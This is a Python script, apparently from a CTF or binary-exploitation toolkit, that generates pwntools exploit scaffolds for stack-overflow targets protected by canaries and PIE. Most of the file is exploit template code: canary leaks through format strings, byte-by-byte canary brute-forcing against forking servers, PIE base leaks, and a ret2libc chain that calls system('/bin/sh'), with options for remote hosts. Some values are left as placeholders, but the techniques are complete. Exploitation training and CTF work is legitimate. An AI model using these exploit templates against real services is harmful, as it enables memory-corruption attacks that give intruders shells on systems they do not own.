#!/usr/bin/env python3
from __future__ import annotations

import argparse
import json
import sys
from pathlib import Path

# Add __lib__ to path for shared utilities
sys.path.insert(0, str(Path(__file__).resolve().parent.parent.parent / "__lib__"))

from pwn_utils import build_context, load_analysis

DEFAULT_OFFSET = 72
DEFAULT_CANARY_OFFSET = 64  # Typically offset - 8 on 64-bit.


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Generate a pwntools leak + exploit scaffold for canary/PIE binaries.")
    parser.add_argument("--analysis", required=True, help="Path to analysis.json from pwn_check.py")
    parser.add_argument("--output", required=True, help="Path to write the generated exploit")
    parser.add_argument("--template", choices=["auto", "canary_fmtstr", "canary_bruteforce", "pie_leak", "combined"], default="auto")
    parser.add_argument("--host", default="127.0.0.1", help="Default remote host placeholder")
    parser.add_argument("--port", type=int, default=1337, help="Default remote port placeholder")
    parser.add_argument("--offset", type=int, default=DEFAULT_OFFSET, help="Buffer overflow offset placeholder")
    parser.add_argument("--canary-offset", type=int, default=DEFAULT_CANARY_OFFSET, help="Canary offset from buffer start")
    parser.add_argument("--binary", help="Override binary path from analysis.json")
    parser.add_argument("--libc", help="Override libc path from analysis.json")
    return parser.parse_args()


def choose_template(analysis: dict) -> str:
    protections = analysis.get("protections", {})
    has_canary = protections.get("canary", False)
    has_pie = protections.get("pie", False)

    if has_canary and has_pie:
        return "combined"

    vulns = analysis.get("vulnerabilities", [])
    has_fmtstr = any(v.get("type") == "format_string" for v in vulns)

    if has_canary:
        return "canary_fmtstr" if has_fmtstr else "canary_bruteforce"

    if has_pie:
        return "pie_leak"

    # Fallback: should not normally reach here if the skill is used correctly.
    return "combined"


def render_canary_fmtstr(ctx: dict) -> str:
    return f"""#!/usr/bin/env python3
from pwn import *

HOST = "{ctx['host']}"
PORT = {ctx['port']}
BINARY = "{ctx['binary_path']}"
OFFSET = {ctx['offset']}          # Total padding to saved return address.
CANARY_OFFSET = {ctx['canary_offset']}  # Padding from buffer start to canary.

elf = ELF(BINARY)
context.binary = elf

gdbscript = '''
b *main
continue
'''

# ---------- tunables ----------
# Stack position of the canary when leaked via format string.
# Find with: for i in range(1, 30): io.sendline(f'%{{i}}$p'); print(i, io.recvline())
CANARY_FMTSTR_POS = 0  # Replace after probing.


def start():
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gdbscript)
    if args.REMOTE:
        return remote(HOST, PORT)
    return process([elf.path])


def leak_canary(io):
    \"\"\"Leak the stack canary via a format string vulnerability.\"\"\"
    if CANARY_FMTSTR_POS == 0:
        log.warning("CANARY_FMTSTR_POS not set -- run the probe loop above first.")
        return 0
    payload = f"%{{CANARY_FMTSTR_POS}}$p".encode()
    io.sendline(payload)
    resp = io.recvline(timeout=2)
    canary = int(resp.strip(), 16)
    log.info("leaked canary: %#x", canary)
    return canary


def build_payload(canary):
    return flat(
        b"A" * CANARY_OFFSET,
        p64(canary),
        b"B" * 8,                         # saved RBP
        p64(0x4141414141414141),           # Replace with target address or ROP chain.
    )


def main():
    io = start()
    canary = leak_canary(io)
    io.sendline(build_payload(canary))
    io.interactive()


if __name__ == "__main__":
    main()
"""


def render_canary_bruteforce(ctx: dict) -> str:
    return f"""#!/usr/bin/env python3
from pwn import *

HOST = "{ctx['host']}"
PORT = {ctx['port']}
BINARY = "{ctx['binary_path']}"
OFFSET = {ctx['offset']}          # Total padding to saved return address.
CANARY_OFFSET = {ctx['canary_offset']}  # Padding from buffer start to canary.

elf = ELF(BINARY)
context.binary = elf

gdbscript = '''
b *main
continue
'''


def start():
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gdbscript)
    if args.REMOTE:
        return remote(HOST, PORT)
    return process([elf.path])


def bruteforce_canary():
    \"\"\"Byte-by-byte canary brute-force for forking servers.

    The canary is the same across fork() children.  The LSB is always
    0x00 on x86-64, so we only need to guess the upper 7 bytes.
    \"\"\"
    known = b"\\x00"  # LSB is null on 64-bit.
    for byte_idx in range(1, 8):
        for guess in range(256):
            try:
                io = start()
                payload = b"A" * CANARY_OFFSET + known + bytes([guess])
                io.send(payload)
                resp = io.recvall(timeout=1)
                # A correct byte keeps the server alive (no stack smash).
                # Adjust this heuristic to match the binary's behavior.
                if b"stack smashing" not in resp and len(resp) > 0:
                    known += bytes([guess])
                    log.info("byte %d: %#x  (canary so far: %s)", byte_idx, guess, known.hex())
                    io.close()
                    break
                io.close()
            except Exception:
                pass
        else:
            log.error("failed to brute-force byte %d", byte_idx)
            return None

    canary = u64(known.ljust(8, b"\\x00"))
    log.success("canary: %#x", canary)
    return canary


def build_payload(canary):
    return flat(
        b"A" * CANARY_OFFSET,
        p64(canary),
        b"B" * 8,                         # saved RBP
        p64(0x4141414141414141),           # Replace with target address or ROP chain.
    )


def main():
    canary = bruteforce_canary()
    if canary is None:
        log.error("canary brute-force failed")
        return
    io = start()
    io.sendline(build_payload(canary))
    io.interactive()


if __name__ == "__main__":
    main()
"""


def render_pie_leak(ctx: dict) -> str:
    libc_path = ctx["libc_path"] or "./libc.so.6"
    return f"""#!/usr/bin/env python3
from pathlib import Path

from pwn import *

HOST = "{ctx['host']}"
PORT = {ctx['port']}
BINARY = "{ctx['binary_path']}"
LIBC_PATH = "{libc_path}"
OFFSET = {ctx['offset']}

elf = ELF(BINARY)
context.binary = elf
libc = ELF(LIBC_PATH) if Path(LIBC_PATH).exists() else None

gdbscript = '''
b *main
continue
'''

# ---------- tunables ----------
# Known offset of the leaked address inside the binary.
# e.g., if puts leaks a .got entry, set this to the GOT slot offset.
LEAK_SYMBOL_OFFSET = 0  # Replace: elf.got['puts'] (relative to PIE base).


def start():
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gdbscript)
    if args.REMOTE:
        return remote(HOST, PORT)
    return process([elf.path])


def leak_pie_base(io):
    \"\"\"Leak a code or GOT address and compute PIE base.

    Common patterns:
      - Binary prints a stack-stored return address (PIE .text leak).
      - A puts/write call on a buffer adjacent to a stored pointer.
      - Format string: %<offset>$p to read a saved RIP.
    \"\"\"
    # --- Replace this section with the actual leak trigger. ---
    io.sendline(b"LEAK_TRIGGER")
    leak = u64(io.recvline().strip().ljust(8, b"\\x00"))
    log.info("raw leak: %#x", leak)

    if LEAK_SYMBOL_OFFSET == 0:
        log.warning("LEAK_SYMBOL_OFFSET not set -- compute PIE base manually.")
        return 0
    pie_base = leak - LEAK_SYMBOL_OFFSET
    log.info("PIE base: %#x", pie_base)
    return pie_base


def build_payload(pie_base):
    rop = ROP(elf, base=pie_base)
    # Example: call system("/bin/sh") via libc if available.
    # Adjust the chain to match the binary's available gadgets.
    return flat(
        b"A" * OFFSET,
        p64(0x4141414141414141),  # Replace with pie_base + known offset.
    )


def main():
    io = start()
    pie_base = leak_pie_base(io)
    io.sendline(build_payload(pie_base))
    io.interactive()


if __name__ == "__main__":
    main()
"""


def render_combined(ctx: dict) -> str:
    libc_path = ctx["libc_path"] or "./libc.so.6"
    return f"""#!/usr/bin/env python3
\"\"\"Combined canary + PIE bypass scaffold.

Flow:
  1. Leak canary (format string or brute-force).
  2. Leak a code address to recover PIE base.
  3. Optionally leak a libc address for ret2libc / one_gadget.
  4. Build payload: padding | canary | saved_rbp | ROP chain.
\"\"\"
from pathlib import Path

from pwn import *

HOST = "{ctx['host']}"
PORT = {ctx['port']}
BINARY = "{ctx['binary_path']}"
LIBC_PATH = "{libc_path}"
OFFSET = {ctx['offset']}          # Total padding to saved return address.
CANARY_OFFSET = {ctx['canary_offset']}  # Padding from buffer start to canary.

elf = ELF(BINARY)
context.binary = elf
libc = ELF(LIBC_PATH) if Path(LIBC_PATH).exists() else None

gdbscript = '''
b *main
continue
'''

# ---------- tunables ----------
CANARY_FMTSTR_POS = 0   # Format string offset for canary.  0 = not set.
PIE_FMTSTR_POS = 0      # Format string offset for a saved RIP.  0 = not set.
PIE_LEAK_KNOWN_OFFSET = 0  # Known offset of the leaked address in the binary.


def start():
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gdbscript)
    if args.REMOTE:
        return remote(HOST, PORT)
    return process([elf.path])


# ---- Stage 1: Leak canary ----

def leak_canary_fmtstr(io):
    \"\"\"Leak canary via format string.\"\"\"
    if CANARY_FMTSTR_POS == 0:
        log.warning("CANARY_FMTSTR_POS not set.")
        return 0
    io.sendline(f"%{{CANARY_FMTSTR_POS}}$p".encode())
    canary = int(io.recvline().strip(), 16)
    log.info("canary: %#x", canary)
    return canary


def leak_canary_bruteforce():
    \"\"\"Byte-by-byte brute-force for forking servers.\"\"\"
    known = b"\\x00"
    for byte_idx in range(1, 8):
        for guess in range(256):
            try:
                io = start()
                payload = b"A" * CANARY_OFFSET + known + bytes([guess])
                io.send(payload)
                resp = io.recvall(timeout=1)
                if b"stack smashing" not in resp and len(resp) > 0:
                    known += bytes([guess])
                    log.info("byte %d: %#x", byte_idx, guess)
                    io.close()
                    break
                io.close()
            except Exception:
                pass
        else:
            log.error("brute-force failed at byte %d", byte_idx)
            return None
    canary = u64(known.ljust(8, b"\\x00"))
    log.success("canary: %#x", canary)
    return canary


# ---- Stage 2: Leak PIE base ----

def leak_pie_base_fmtstr(io):
    \"\"\"Leak a saved return address via format string to recover PIE base.\"\"\"
    if PIE_FMTSTR_POS == 0:
        log.warning("PIE_FMTSTR_POS not set.")
        return 0
    io.sendline(f"%{{PIE_FMTSTR_POS}}$p".encode())
    leak = int(io.recvline().strip(), 16)
    log.info("raw PIE leak: %#x", leak)
    if PIE_LEAK_KNOWN_OFFSET == 0:
        log.warning("PIE_LEAK_KNOWN_OFFSET not set -- compute base manually.")
        return 0
    pie_base = leak - PIE_LEAK_KNOWN_OFFSET
    log.info("PIE base: %#x", pie_base)
    return pie_base


def leak_pie_base_puts(io, pie_base_guess=0):
    \"\"\"Leak PIE base via puts on a GOT entry (requires partial overwrite or prior leak).\"\"\"
    # Replace with actual trigger logic.
    io.sendline(b"LEAK_TRIGGER")
    leak = u64(io.recvline().strip().ljust(8, b"\\x00"))
    log.info("raw PIE leak: %#x", leak)
    if PIE_LEAK_KNOWN_OFFSET == 0:
        return 0
    return leak - PIE_LEAK_KNOWN_OFFSET


# ---- Stage 3 (optional): Leak libc base ----

def leak_libc_base(io, pie_base):
    \"\"\"Leak a GOT entry to compute libc base.  Requires PIE base.\"\"\"
    if libc is None:
        log.warning("No libc loaded -- set LIBC_PATH.")
        return 0
    # Build a small ROP chain: pop rdi; got_entry; puts@plt; main
    rop = ROP(elf, base=pie_base)
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])
    if pop_rdi is None:
        log.warning("No pop rdi gadget found.")
        return 0
    puts_got = pie_base + elf.got["puts"]
    puts_plt = pie_base + elf.plt["puts"]
    main_addr = pie_base + elf.symbols.get("main", 0)
    # Caller must send this payload at the right time.
    log.info("send libc leak ROP after canary + rbp")
    return 0  # Replace with actual leak parsing.


# ---- Stage 4: Final payload ----

def build_payload(canary, pie_base, libc_base=0):
    \"\"\"Construct the final overflow payload.\"\"\"
    chain = []
    chain.append(b"A" * CANARY_OFFSET)
    chain.append(p64(canary))
    chain.append(b"B" * 8)  # saved RBP

    # Replace this block with the actual ROP chain.
    # Example: ret2libc via one_gadget or system("/bin/sh").
    if libc_base and libc:
        ret = pie_base + (ROP(elf, base=pie_base).find_gadget(["ret"]).address if ROP(elf, base=pie_base).find_gadget(["ret"]) else 0)
        pop_rdi = pie_base + (ROP(elf, base=pie_base).find_gadget(["pop rdi", "ret"]).address if ROP(elf, base=pie_base).find_gadget(["pop rdi", "ret"]) else 0)
        system = libc_base + libc.sym["system"]
        bin_sh = libc_base + next(libc.search(b"/bin/sh\\x00"))
        chain.extend([p64(ret), p64(pop_rdi), p64(bin_sh), p64(system)])
    else:
        chain.append(p64(0x4141414141414141))  # Placeholder target.

    return flat(*chain)


def main():
    # -- Leak canary --
    io = start()
    canary = leak_canary_fmtstr(io)
    # Alternatively: canary = leak_canary_bruteforce()
    io.close()

    # -- Leak PIE base --
    io = start()
    pie_base = leak_pie_base_fmtstr(io)
    io.close()

    # -- Final exploit --
    io = start()
    io.sendline(build_payload(canary, pie_base))
    io.interactive()


if __name__ == "__main__":
    main()
"""


RENDERERS = {
    "canary_fmtstr": render_canary_fmtstr,
    "canary_bruteforce": render_canary_bruteforce,
    "pie_leak": render_pie_leak,
    "combined": render_combined,
}


def main() -> int:
    args = parse_args()
    analysis = load_analysis(args.analysis)
    template = args.template if args.template != "auto" else choose_template(analysis)
    ctx = build_context(args, analysis, template, extra_keys={"canary_offset": args.canary_offset})

    renderer = RENDERERS.get(template)
    if renderer is None:
        print(f"Unknown template: {template}", file=sys.stderr)
        return 1

    content = renderer(ctx)
    output_path = Path(args.output)
    output_path.write_text(content, encoding="utf-8")
    print(json.dumps({
        "output": str(output_path),
        "template": template,
        "binary": ctx["binary_path"],
        "libc": ctx["libc_path"],
        "protections": {
            "canary": analysis.get("protections", {}).get("canary", False),
            "pie": analysis.get("protections", {}).get("pie", False),
        },
    }, indent=2))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
